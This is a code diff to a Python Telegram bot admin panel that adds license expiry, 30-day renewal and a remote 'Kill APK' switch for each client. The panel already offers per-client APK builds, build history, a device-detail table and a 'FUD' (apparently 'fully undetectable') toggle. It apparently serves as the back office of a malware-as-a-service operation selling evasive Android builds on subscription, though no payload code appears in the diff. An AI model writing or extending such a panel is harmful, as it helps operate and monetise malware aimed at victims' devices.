@@ -247,6 +247,18 @@ def init_db():
     except Exception:
         pass  # column already exists
 
+    for col, defn in [
+        ("expire_ts",   "INTEGER DEFAULT 0"),
+        ("killed",      "INTEGER DEFAULT 0"),
+        ("grace_hours", "INTEGER DEFAULT 72"),
+    ]:
+        try:
+            db.execute(f"ALTER TABLE clients ADD COLUMN {col} {defn}")
+            db.commit()
+            log.info(f"Migration: added clients.{col}")
+        except Exception:
+            pass  # column already exists
+
     # ── Migration: devices table — device detail fields ───────────────────────
     for col, defn in [
         ("model",           "TEXT DEFAULT ''"),
@@ -1112,25 +1124,41 @@ def kb_clients(clients: list) -> types.InlineKeyboardMarkup:
     return kb
 
 
-def kb_client_detail(client_id: int, active: bool = True, vpn_bypass: int = 1) -> types.InlineKeyboardMarkup:
+def kb_client_detail(client_id: int, active: bool = True, vpn_bypass: int = 1,
+                     killed: int = 0, expire_ts: int = 0) -> types.InlineKeyboardMarkup:
     kb = types.InlineKeyboardMarkup(row_width=1)
-    # Primary actions
+
+    # ── BUILD SECTION ─────────────────────────────────────────────────────────
     kb.add(types.InlineKeyboardButton(
         "🏗 New Build",        callback_data=f"new_build_{client_id}"))
     kb.add(types.InlineKeyboardButton(
         "📋 Builds History",   callback_data=f"builds_history_{client_id}"))
-    kb.add(types.InlineKeyboardButton(
-        "📊 Stats",            callback_data=f"client_stats_{client_id}"))
-    # Edit
-    kb.add(types.InlineKeyboardButton(
-        "✏️ Edit Client",      callback_data=f"edit_client_{client_id}"))
-    # Toggle active/inactive
-    if active:
+
+    # ── LICENSE SECTION ───────────────────────────────────────────────────────
+    # Expire display — human-readable
+    if expire_ts and expire_ts > 0:
+        exp_str = datetime.fromtimestamp(expire_ts, tz=timezone.utc).strftime("%d %b %Y")
         kb.add(types.InlineKeyboardButton(
-            "🔴 Deactivate",   callback_data=f"toggle_client_{client_id}"))
+            f"⏰ Expires: {exp_str}",  callback_data=f"set_expire_{client_id}"))
     else:
         kb.add(types.InlineKeyboardButton(
-            "🟢 Activate",     callback_data=f"toggle_client_{client_id}"))
+            "⏰ Set Expiry",           callback_data=f"set_expire_{client_id}"))
+    # Renew — extend subscription by 30 days
+    kb.add(types.InlineKeyboardButton(
+        "🔑 Renew (+30 days)",         callback_data=f"renew_license_{client_id}"))
+    # Kill APK toggle
+    if killed:
+        kb.add(types.InlineKeyboardButton(
+            "✅ Revive APK",            callback_data=f"kill_apk_{client_id}"))
+    else:
+        kb.add(types.InlineKeyboardButton(
+            "💀 Kill APK",              callback_data=f"kill_apk_{client_id}"))
+
+    # ── STATUS SECTION ────────────────────────────────────────────────────────
+    kb.add(types.InlineKeyboardButton(
+        "📊 Stats",            callback_data=f"client_stats_{client_id}"))
+
+    # ── CONFIG SECTION ────────────────────────────────────────────────────────
     # FUD toggle
     if vpn_bypass:
         kb.add(types.InlineKeyboardButton(
@@ -1138,15 +1166,25 @@ def kb_client_detail(client_id: int, active: bool = True, vpn_bypass: int = 1) -
     else:
         kb.add(types.InlineKeyboardButton(
             "🟢 FUD: OFF → Turn ON",  callback_data=f"toggle_fud_{client_id}"))
-    # Navigation
+    kb.add(types.InlineKeyboardButton(
+        "✏️ Edit Client",      callback_data=f"edit_client_{client_id}"))
+
+    # ── NAVIGATION ────────────────────────────────────────────────────────────
     kb.add(
-        types.InlineKeyboardButton(
-            "🔙 Back", callback_data="nav_clients"),
+        types.InlineKeyboardButton("🔙 Back", callback_data="nav_clients"),
         types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"),
     )
-    # Destructive — bottom
+
+    # ── DANGER ZONE ───────────────────────────────────────────────────────────
+    if active:
+        kb.add(types.InlineKeyboardButton(
+            "🔴 Deactivate",   callback_data=f"toggle_client_{client_id}"))
+    else:
+        kb.add(types.InlineKeyboardButton(
+            "🟢 Activate",     callback_data=f"toggle_client_{client_id}"))
     kb.add(types.InlineKeyboardButton(
         "🗑 Delete Client",    callback_data=f"delete_client_{client_id}"))
+
     return kb
 
 
@@ -1608,10 +1646,29 @@ def text_client_detail(c: dict) -> str:
     fud_label    = "🟢 ON" if c.get("vpn_bypass", 1) else "🔴 OFF"
     username_line = f"@{c['telegram_username']}" if c['telegram_username'] else "—"
     profile_line  = c['profile_name'] if c['profile_name'] else "—"
+
+    # License status
+    killed    = int(c.get("killed", 0) or 0)
+    expire_ts = int(c.get("expire_ts", 0) or 0)
+    grace_hrs = int(c.get("grace_hours", 72) or 72)
+    now_ts    = int(time.time())
+    if killed:
+        license_line = "💀 KILLED"
+    elif expire_ts == 0:
+        license_line = "♾️ No expiry"
+    elif expire_ts < now_ts:
+        days_over = (now_ts - expire_ts) // 86400
+        license_line = f"⚠️ Expired ({days_over}d ago — grace {grace_hrs}h)"
+    else:
+        days_left = (expire_ts - now_ts) // 86400
+        exp_str   = datetime.fromtimestamp(expire_ts, tz=timezone.utc).strftime("%d %b %Y")
+        license_line = f"✅ Active — {exp_str} ({days_left}d left)"
+
     return (
         f"👤 <b>{name}</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         f"Status      : {'🟢 Active' if c['active'] else '🔴 Inactive'}\n"
+        f"License     : {license_line}\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
         f"Profile     : {profile_line}\n"
         f"Username    : {username_line}\n"
@@ -2699,8 +2756,11 @@ def show_client_detail(chat_id, message_id, client_id):
         return
     safe_edit(chat_id, message_id,
               text_client_detail(dict(c)),
-              kb_client_detail(client_id, active=bool(c["active"]),
-                               vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1)))
+              kb_client_detail(client_id,
+                               active=bool(c["active"]),
+                               vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
+                               killed=int(c["killed"] if "killed" in c.keys() else 0),
+                               expire_ts=int(c["expire_ts"] if "expire_ts" in c.keys() else 0)))
 
 
 def show_builds_history(chat_id, message_id, client_id):
@@ -4152,6 +4212,81 @@ def handle_prod_commit_input(message):
 
 
 @bot.message_handler(
+    func=lambda m: nav_state.get(str(m.chat.id), {}).get("screen") == "set_expire"
+                   and m.text is not None)
+def handle_set_expire_input(message):
+    """Operator typed a date string for set_expire flow."""
+    chat_id = str(message.chat.id)
+    if not is_admin(message.chat.id) or not session_valid(message.chat.id):
+        return
+    state     = nav_state.get(chat_id, {})
+    client_id = state.get("client_id")
+    msg_id    = state.get("message_id")
+    try:
+        bot.delete_message(message.chat.id, message.message_id)
+    except Exception:
+        pass
+    text = (message.text or "").strip()
+
+    if text == "0":
+        # Remove expiry — no time limit
+        db = get_db()
+        db.execute("UPDATE clients SET expire_ts=0, killed=0 WHERE id=?", (client_id,))
+        db.commit()
+        c = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+        db.close()
+        nav_state.pop(chat_id, None)
+        safe_edit(message.chat.id, msg_id,
+                  "✅ <b>Expiry removed</b> — no time limit.\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  + text_client_detail(dict(c)),
+                  kb_client_detail(client_id,
+                                   active=bool(c["active"]),
+                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
+                                   killed=0, expire_ts=0))
+        return
+
+    # Parse DD/MM/YYYY or DD-MM-YYYY
+    import re as _re
+    m = _re.match(r"(\d{1,2})[/\-](\d{1,2})[/\-](\d{4})", text)
+    if not m:
+        safe_edit(message.chat.id, msg_id,
+                  "❌ Invalid date format.\n"
+                  "Use <code>DD/MM/YYYY</code> — e.g. <code>31/12/2026</code>",
+                  types.InlineKeyboardMarkup().add(
+                      types.InlineKeyboardButton("🔙 Cancel", callback_data=f"client_{client_id}")))
+        return
+
+    day, month, year = int(m.group(1)), int(m.group(2)), int(m.group(3))
+    try:
+        from datetime import datetime as _dt
+        new_expire = int(_dt(year, month, day, 23, 59, 59,
+                             tzinfo=timezone.utc).timestamp())
+    except ValueError:
+        safe_edit(message.chat.id, msg_id,
+                  "❌ Invalid date — check day/month values.",
+                  types.InlineKeyboardMarkup().add(
+                      types.InlineKeyboardButton("🔙 Cancel", callback_data=f"client_{client_id}")))
+        return
+
+    db = get_db()
+    db.execute("UPDATE clients SET expire_ts=?, killed=0 WHERE id=?", (new_expire, client_id))
+    db.commit()
+    c = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+    db.close()
+    nav_state.pop(chat_id, None)
+    exp_str = datetime.fromtimestamp(new_expire, tz=timezone.utc).strftime("%d %b %Y")
+    safe_edit(message.chat.id, msg_id,
+              f"✅ <b>Expiry set: {exp_str}</b>\n"
+              "━━━━━━━━━━━━━━━━━━━━\n"
+              + text_client_detail(dict(c)),
+              kb_client_detail(client_id,
+                               active=bool(c["active"]),
+                               vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
+                               killed=0, expire_ts=new_expire))
+
+
+@bot.message_handler(
     func=lambda m: edit_client_buf.get(str(m.chat.id)) is not None)
 def handle_edit_client_input(message):
     chat_id = str(message.chat.id)
@@ -4634,7 +4769,9 @@ def handle_callback(call):
                   f"━━━━━━━━━━━━━━━━━━━━\n"
                   + text_client_detail(dict(c)),
                   kb_client_detail(client_id, active=bool(new_active),
-                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1)))
+                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
+                                   killed=int(c["killed"] if "killed" in c.keys() else 0),
+                                   expire_ts=int(c["expire_ts"] if "expire_ts" in c.keys() else 0)))
 
     elif data == "do_unlock":
         # Emergency unlock: set nav_state to awaiting_unlock so the next
@@ -4676,7 +4813,95 @@ def handle_callback(call):
                   f"━━━━━━━━━━━━━━━━━━━━\n"
                   + text_client_detail(dict(c)),
                   kb_client_detail(client_id, active=bool(c["active"]),
-                                   vpn_bypass=new_bypass))
+                                   vpn_bypass=new_bypass,
+                                   killed=int(c["killed"] if "killed" in c.keys() else 0),
+                                   expire_ts=int(c["expire_ts"] if "expire_ts" in c.keys() else 0)))
+
+    elif data.startswith("kill_apk_"):
+        # Toggle killed flag — kills or revives the APK license
+        client_id = int(data.split("_")[2])
+        db        = get_db()
+        c         = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+        if not c:
+            db.close()
+            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
+            return
+        new_killed = 0 if int(c["killed"] if "killed" in c.keys() else 0) else 1
+        db.execute("UPDATE clients SET killed=? WHERE id=?", (new_killed, client_id))
+        db.commit()
+        db.close()
+        db  = get_db()
+        c   = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+        db.close()
+        action_word = "💀 APK Killed" if new_killed else "✅ APK Revived"
+        safe_edit(chat_id, msg_id,
+                  f"<b>{action_word}</b>\n"
+                  f"━━━━━━━━━━━━━━━━━━━━\n"
+                  + text_client_detail(dict(c)),
+                  kb_client_detail(client_id,
+                                   active=bool(c["active"]),
+                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
+                                   killed=new_killed,
+                                   expire_ts=int(c["expire_ts"] if "expire_ts" in c.keys() else 0)))
+
+    elif data.startswith("renew_license_"):
+        # Extend subscription by 30 days from now (or from current expire_ts if in future)
+        client_id = int(data.split("_")[2])
+        db        = get_db()
+        c         = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+        if not c:
+            db.close()
+            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
+            return
+        now_ts       = int(time.time())
+        cur_expire   = int(c["expire_ts"] if "expire_ts" in c.keys() else 0) or 0
+        # Extend from current expiry if it's in the future, else extend from now
+        base         = cur_expire if cur_expire > now_ts else now_ts
+        new_expire   = base + (30 * 86400)  # +30 days
+        db.execute("UPDATE clients SET expire_ts=?, killed=0 WHERE id=?", (new_expire, client_id))
+        db.commit()
+        db.close()
+        db  = get_db()
+        c   = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+        db.close()
+        exp_str = datetime.fromtimestamp(new_expire, tz=timezone.utc).strftime("%d %b %Y")
+        safe_edit(chat_id, msg_id,
+                  f"✅ <b>License Renewed</b>\n"
+                  f"━━━━━━━━━━━━━━━━━━━━\n"
+                  f"New expiry: <b>{exp_str}</b>\n"
+                  f"━━━━━━━━━━━━━━━━━━━━\n"
+                  + text_client_detail(dict(c)),
+                  kb_client_detail(client_id,
+                                   active=bool(c["active"]),
+                                   vpn_bypass=int(c["vpn_bypass"] if "vpn_bypass" in c.keys() else 1),
+                                   killed=0,
+                                   expire_ts=new_expire))
+
+    elif data.startswith("set_expire_"):
+        # Prompt operator to type new expiry date
+        client_id = int(data.split("_")[2])
+        db        = get_db()
+        c         = db.execute("SELECT * FROM clients WHERE id=?", (client_id,)).fetchone()
+        db.close()
+        if not c:
+            safe_edit(chat_id, msg_id, "❌ Client not found.", kb_home_only())
+            return
+        name = c["profile_name"] or c["telegram_username"]
+        # Store context so next text message sets the expiry date
+        nav_state[str(chat_id)] = {
+            "screen":     "set_expire",
+            "client_id":  client_id,
+            "message_id": msg_id,
+        }
+        safe_edit(chat_id, msg_id,
+                  f"⏰ <b>Set Expiry — {name}</b>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "Reply with expiry date:\n"
+                  "<code>DD/MM/YYYY</code>  or  <code>DD-MM-YYYY</code>\n\n"
+                  "Example: <code>31/12/2026</code>\n\n"
+                  "Or reply <code>0</code> to remove expiry (no time limit).",
+                  types.InlineKeyboardMarkup().add(
+                      types.InlineKeyboardButton("🔙 Cancel", callback_data=f"client_{client_id}")))
 
     elif data.startswith("delete_client_"):
         client_id = int(data.split("_")[2])
